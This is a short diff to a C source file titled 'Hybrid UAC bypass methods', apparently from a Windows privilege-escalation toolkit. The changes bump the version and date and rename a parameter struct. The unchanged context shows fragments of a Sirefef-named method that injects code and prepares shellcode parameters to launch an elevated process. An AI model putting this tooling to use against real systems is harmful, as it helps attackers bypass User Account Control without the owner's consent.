@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2019
+*  (C) COPYRIGHT AUTHORS, 2015 - 2020
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.20
+*  VERSION:     3.23
 *
-*  DATE:        22 Oct 2019
+*  DATE:        17 Dec 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -20,7 +20,7 @@
 #include "makecab.h"
 #include "encresource.h"
 
-LOAD_PARAMETERS_SIREFEF g_SirefefLoadParams;
+LOAD_PARAMETERS g_SirefefLoadParams;
 
 /*
 * ucmMethodCleanupSingleFileSystem32
@@ -467,7 +467,7 @@ BOOL ucmSirefefMethodCleanup(
 *
 */
 DWORD WINAPI ucmxElevatedLaunchProc(
-    _In_ LOAD_PARAMETERS_SIREFEF *Params
+    _In_ LOAD_PARAMETERS *Params
 )
 {
     SHELLEXECUTEINFOW shexec;
@@ -513,7 +513,7 @@ NTSTATUS ucmSirefefMethod(
     HINSTANCE                 InjectorImageBase = g_hInstance;
     PIMAGE_NT_HEADERS         NtHeaders = RtlImageNtHeader(InjectorImageBase);
     LPVOID                    RemoteCode = NULL, newEp, newDp;
-    PLOAD_PARAMETERS_SIREFEF  LoadParams = &g_SirefefLoadParams;
+    PLOAD_PARAMETERS          LoadParams = &g_SirefefLoadParams;
     PVOID                     LoadProc = ucmxElevatedLaunchProc;
 
     WCHAR                     szB1[MAX_PATH * 2];
@@ -560,7 +560,7 @@ NTSTATUS ucmSirefefMethod(
         //
         // Prepare shellcode params.
         //
-        RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS_SIREFEF));
+        RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS));
 
         _strcpy(LoadParams->szVerb, RUNAS_VERB);
 
